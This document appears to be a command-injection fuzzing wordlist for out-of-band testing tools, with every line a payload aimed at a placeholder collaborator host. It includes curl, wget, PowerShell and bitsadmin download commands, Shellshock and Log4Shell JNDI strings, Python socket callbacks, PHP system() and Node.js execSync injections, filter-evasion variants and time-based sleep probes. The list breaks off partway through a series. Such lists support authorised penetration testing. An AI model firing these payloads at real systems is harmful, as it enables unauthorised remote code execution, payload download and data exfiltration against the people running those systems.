+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+&&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+&&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+&&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+&&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+&&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+&&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+&&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+&&ping !-VARIABLE_COLLABORATOR-!&
+&&ping !-VARIABLE_COLLABORATOR-!&&
+&&ping !-VARIABLE_COLLABORATOR-!|
+&&ping !-VARIABLE_COLLABORATOR-!||
+&&ping !-VARIABLE_COLLABORATOR-!;
+&&ping !-VARIABLE_COLLABORATOR-!%00
+&&ping !-VARIABLE_COLLABORATOR-!#
+&&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+&&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+&&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+&&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+&&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+&&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+&&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+&&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+&&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+&&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+&&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+&&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+&&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+&&wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+&&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+&&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+&&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+&&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+&&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+&&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+&&iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+&&bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+&&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+&&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+&&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+&&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+&&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+&&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+&&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+&&ping !-VARIABLE_COLLABORATOR-!&
+&&ping !-VARIABLE_COLLABORATOR-!&&
+&&ping !-VARIABLE_COLLABORATOR-!|
+&&ping !-VARIABLE_COLLABORATOR-!||
+&&ping !-VARIABLE_COLLABORATOR-!;
+&&ping !-VARIABLE_COLLABORATOR-!%00
+&&ping !-VARIABLE_COLLABORATOR-!#
+&&\\!-VARIABLE_COLLABORATOR-!\share&
+&&\\!-VARIABLE_COLLABORATOR-!\share&&
+&&\\!-VARIABLE_COLLABORATOR-!\share|
+&&\\!-VARIABLE_COLLABORATOR-!\share||
+&&\\!-VARIABLE_COLLABORATOR-!\share;
+&&\\!-VARIABLE_COLLABORATOR-!\share%00
+&&\\!-VARIABLE_COLLABORATOR-!\share#
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+&&() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+&&() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+&&${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+&&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+&&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+&&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+&&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+&&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+&&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+&&python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+&&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+&&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+&&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+&&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+&&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+&&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+&&import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt
+wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt
+iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt
+fetch !-VARIABLE_COLLABORATOR-!/fetch.txt
+ping !-VARIABLE_COLLABORATOR-!
+curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt
+wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt
+iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt
+bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt
+fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt
+ping !-VARIABLE_COLLABORATOR-!
+\\!-VARIABLE_COLLABORATOR-!\share
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt
+() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt
+() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}
+${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'
+import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")
+`curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt`
+`wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt`
+`iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt`
+`bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt`
+`fetch !-VARIABLE_COLLABORATOR-!/fetch.txt`
+`ping !-VARIABLE_COLLABORATOR-!`
+`curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt`
+`wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt`
+`iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt`
+`bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt`
+`fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt`
+`ping !-VARIABLE_COLLABORATOR-!`
+(curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt)
+(wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt)
+(iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt)
+(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt)
+(fetch !-VARIABLE_COLLABORATOR-!/fetch.txt)
+(ping !-VARIABLE_COLLABORATOR-!)
+(curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt)
+(wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt)
+(iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt)
+(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt)
+(fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt)
+(ping !-VARIABLE_COLLABORATOR-!)
+{curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt}
+{wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt}
+{iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt}
+{bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt}
+{fetch !-VARIABLE_COLLABORATOR-!/fetch.txt}
+{ping !-VARIABLE_COLLABORATOR-!}
+{curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt}
+{wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt}
+{iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt}
+{bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt}
+{fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt}
+{ping !-VARIABLE_COLLABORATOR-!}
+$(curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt)
+$(wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt)
+$(iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt)
+$(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt)
+$(fetch !-VARIABLE_COLLABORATOR-!/fetch.txt)
+$(ping !-VARIABLE_COLLABORATOR-!)
+$(curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt)
+$(wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt)
+$(iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt)
+$(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt)
+$(fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt)
+$(ping !-VARIABLE_COLLABORATOR-!)
+$(`curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt`)
+$(`wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt`)
+$(`iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt`)
+$(`bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt`)
+$(`fetch !-VARIABLE_COLLABORATOR-!/fetch.txt`)
+$(`ping !-VARIABLE_COLLABORATOR-!`)
+$(`curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt`)
+$(`wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt`)
+$(`iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt`)
+$(`bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt`)
+$(`fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt`)
+$(`ping !-VARIABLE_COLLABORATOR-!`)
+system'(curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt')
+system'(wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt')
+system'(iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt')
+system'(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt')
+system'(fetch !-VARIABLE_COLLABORATOR-!/fetch.txt')
+system'(ping !-VARIABLE_COLLABORATOR-!')
+system'(curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt')
+system'(wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt')
+system'(iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt')
+system'(bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt')
+system'(fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt')
+system'(ping !-VARIABLE_COLLABORATOR-!')
+<?php system("curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt");?>
+<?php system("wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt");?>
+<?php system("iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt");?>
+<?php system("bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt");?>
+<?php system("fetch !-VARIABLE_COLLABORATOR-!/fetch.txt");?>
+<?php system("ping !-VARIABLE_COLLABORATOR-!");?>
+<?php system("curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt");?>
+<?php system("wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt");?>
+<?php system("iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt");?>
+<?php system("bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt");?>
+<?php system("fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt");?>
+<?php system("ping !-VARIABLE_COLLABORATOR-!");?>
+){this.global.process.mainModule.require("child_process").execSync("curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("fetch !-VARIABLE_COLLABORATOR-!/fetch.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("ping !-VARIABLE_COLLABORATOR-!")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("ping !-VARIABLE_COLLABORATOR-!")}; with(obj
+$(curl${IFS}!-VARIABLE_COLLABORATOR-!)
+$(ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!)
+%0acurl${IFS}!-VARIABLE_COLLABORATOR-!
+%0aping !-VARIABLE_COLLABORATOR-!
+%0aping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
+&&curl${IFS}!-VARIABLE_COLLABORATOR-!
+&&n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
+&&n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
+&&p"i"n"g" !-VARIABLE_COLLABORATOR-!
+&&p'i'n'g' !-VARIABLE_COLLABORATOR-!
+&&ping !-VARIABLE_COLLABORATOR-!
+&&ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
+&curl${IFS}!-VARIABLE_COLLABORATOR-!
+&n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
+&n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
+&p"i"n"g" !-VARIABLE_COLLABORATOR-!
+&p'i'n'g' !-VARIABLE_COLLABORATOR-!
+&ping !-VARIABLE_COLLABORATOR-!
+&ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
+;curl${IFS}!-VARIABLE_COLLABORATOR-!
+;n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
+;n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
+;p"i"n"g" !-VARIABLE_COLLABORATOR-!
+;p'i'n'g' !-VARIABLE_COLLABORATOR-!
+;ping !-VARIABLE_COLLABORATOR-!
+;ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
+`curl${IFS}!-VARIABLE_COLLABORATOR-!`
+`ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!`
+|curl${IFS}!-VARIABLE_COLLABORATOR-!
+|n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
+|n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
+|p"i"n"g" !-VARIABLE_COLLABORATOR-!
+|p'i'n'g' !-VARIABLE_COLLABORATOR-!
+|ping !-VARIABLE_COLLABORATOR-!
+|ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
+||curl${IFS}!-VARIABLE_COLLABORATOR-!
+||n"s"l"o"o"k"u"p" !-VARIABLE_COLLABORATOR-!
+||n's'l'o'o'k'u'p' !-VARIABLE_COLLABORATOR-!
+||p"i"n"g" !-VARIABLE_COLLABORATOR-!
+||p'i'n'g' !-VARIABLE_COLLABORATOR-!
+||ping !-VARIABLE_COLLABORATOR-!
+||ping${IFS}-c2${IFS}!-VARIABLE_COLLABORATOR-!
+{${sleep(20)}}&
+{${sleep(20)}}&&
+{${sleep(20)}}|
+{${sleep(20)}}||
+{${sleep(20)}};
+{${sleep(20)}}%00
+{${sleep(20)}}#
+{${sleep(hexdec(dechex(20)))}}&
+{${sleep(hexdec(dechex(20)))}}&&
+{${sleep(hexdec(dechex(20)))}}|
+{${sleep(hexdec(dechex(20)))}}||
+{${sleep(hexdec(dechex(20)))}};
+{${sleep(hexdec(dechex(20)))}}%00
+{${sleep(hexdec(dechex(20)))}}#
+() { :;}; sleep 20&
+() { :;}; sleep 20&&
+() { :;}; sleep 20|
+() { :;}; sleep 20||
+() { :;}; sleep 20;
+() { :;}; sleep 20%00
+() { :;}; sleep 20#
+eval('sleep 20')&
+eval('sleep 20')&&
+eval('sleep 20')|
+eval('sleep 20')||
+eval('sleep 20');
+eval('sleep 20')%00
+eval('sleep 20')#
+perl -e 'sleep(20)'&
+perl -e 'sleep(20)'&&
+perl -e 'sleep(20)'|
+perl -e 'sleep(20)'||
+perl -e 'sleep(20)';
+perl -e 'sleep(20)'%00
+perl -e 'sleep(20)'#
+<?php system("sleep 20");?>&
+<?php system("sleep 20");?>&&
+<?php system("sleep 20");?>|
+<?php system("sleep 20");?>||
+<?php system("sleep 20");?>;
+<?php system("sleep 20");?>%00
+<?php system("sleep 20");?>#
+sleep(20)&
+sleep(20)&&
+sleep(20)|
+sleep(20)||
+sleep(20);
+sleep(20)%00
+sleep(20)#
+sleep 20&
+sleep 20&&
+sleep 20|
+sleep 20||
+sleep 20;
+sleep 20%00
+sleep 20#
+system('sleep 20')&
+system('sleep 20')&&
+system('sleep 20')|
+system('sleep 20')||
+system('sleep 20');
+system('sleep 20')%00
+system('sleep 20')#
+timeout 20&
+timeout 20&&
+timeout 20|
+timeout 20||
+timeout 20;
+timeout 20%00
+timeout 20#
+ping -c 20 127.0.0.1&
+ping -c 20 127.0.0.1&&
+ping -c 20 127.0.0.1|
+ping -c 20 127.0.0.1||
+ping -c 20 127.0.0.1;
+ping -c 20 127.0.0.1%00
+ping -c 20 127.0.0.1#
+(ping -c 20 127.0.0.1)&
+(ping -c 20 127.0.0.1)&&
+(ping -c 20 127.0.0.1)|
+(ping -c 20 127.0.0.1)||
+(ping -c 20 127.0.0.1);
+(ping -c 20 127.0.0.1)%00
+(ping -c 20 127.0.0.1)#
+$(ping -c 20 127.0.0.1)&
+$(ping -c 20 127.0.0.1)&&
+$(ping -c 20 127.0.0.1)|
+$(ping -c 20 127.0.0.1)||
+$(ping -c 20 127.0.0.1);
+$(ping -c 20 127.0.0.1)%00
+$(ping -c 20 127.0.0.1)#
+`ping -c 20 127.0.0.1`&
+`ping -c 20 127.0.0.1`&&
+`ping -c 20 127.0.0.1`|
+`ping -c 20 127.0.0.1`||
+`ping -c 20 127.0.0.1`;
+`ping -c 20 127.0.0.1`%00
+`ping -c 20 127.0.0.1`#
+{ping -c 20 127.0.0.1}&
+{ping -c 20 127.0.0.1}&&
+{ping -c 20 127.0.0.1}|
+{ping -c 20 127.0.0.1}||
+{ping -c 20 127.0.0.1};
+{ping -c 20 127.0.0.1}%00
+{ping -c 20 127.0.0.1}#
+${`ping -c 20 127.0.0.1`}&
+${`ping -c 20 127.0.0.1`}&&
+${`ping -c 20 127.0.0.1`}|
+${`ping -c 20 127.0.0.1`}||
+${`ping -c 20 127.0.0.1`};
+${`ping -c 20 127.0.0.1`}%00
+${`ping -c 20 127.0.0.1`}#
+'{${sleep(20)}}&
+'{${sleep(20)}}&&
+'{${sleep(20)}}|
+'{${sleep(20)}}||
+'{${sleep(20)}};
+'{${sleep(20)}}%00
+'{${sleep(20)}}#
+'{${sleep(hexdec(dechex(20)))}}&
+'{${sleep(hexdec(dechex(20)))}}&&
+'{${sleep(hexdec(dechex(20)))}}|
+'{${sleep(hexdec(dechex(20)))}}||
+'{${sleep(hexdec(dechex(20)))}};
+'{${sleep(hexdec(dechex(20)))}}%00
+'{${sleep(hexdec(dechex(20)))}}#
+'() { :;}; sleep 20&
+'() { :;}; sleep 20&&
+'() { :;}; sleep 20|
+'() { :;}; sleep 20||
+'() { :;}; sleep 20;
+'() { :;}; sleep 20%00
+'() { :;}; sleep 20#
+'eval('sleep 20')&
+'eval('sleep 20')&&
+'eval('sleep 20')|
+'eval('sleep 20')||
+'eval('sleep 20');
+'eval('sleep 20')%00
+'eval('sleep 20')#
+'perl -e 'sleep(20)'&
+'perl -e 'sleep(20)'&&
+'perl -e 'sleep(20)'|
+'perl -e 'sleep(20)'||
+'perl -e 'sleep(20)';
+'perl -e 'sleep(20)'%00
+'perl -e 'sleep(20)'#
+'<?php system("sleep 20");?>&
+'<?php system("sleep 20");?>&&
+'<?php system("sleep 20");?>|
+'<?php system("sleep 20");?>||
+'<?php system("sleep 20");?>;
+'<?php system("sleep 20");?>%00
+'<?php system("sleep 20");?>#
+'sleep(20)&
+'sleep(20)&&
+'sleep(20)|
+'sleep(20)||
+'sleep(20);
+'sleep(20)%00
+'sleep(20)#
+'sleep 20&
+'sleep 20&&
+'sleep 20|
+'sleep 20||
+'sleep 20;
+'sleep 20%00
+'sleep 20#
+'system('sleep 20')&
+'system('sleep 20')&&
+'system('sleep 20')|
+'system('sleep 20')||
+'system('sleep 20');
+'system('sleep 20')%00
+'system('sleep 20')#
+'timeout 20&
+'timeout 20&&
+'timeout 20|
+'timeout 20||
+'timeout 20;
+'timeout 20%00
+'timeout 20#
+'ping -c 20 127.0.0.1&
+'ping -c 20 127.0.0.1&&
+'ping -c 20 127.0.0.1|
+'ping -c 20 127.0.0.1||
+'ping -c 20 127.0.0.1;
+'ping -c 20 127.0.0.1%00
+'ping -c 20 127.0.0.1#
+'(ping -c 20 127.0.0.1)&
+'(ping -c 20 127.0.0.1)&&
+'(ping -c 20 127.0.0.1)|
+'(ping -c 20 127.0.0.1)||
+'(ping -c 20 127.0.0.1);
+'(ping -c 20 127.0.0.1)%00
+'(ping -c 20 127.0.0.1)#
+'$(ping -c 20 127.0.0.1)&
+'$(ping -c 20 127.0.0.1)&&
+'$(ping -c 20 127.0.0.1)|
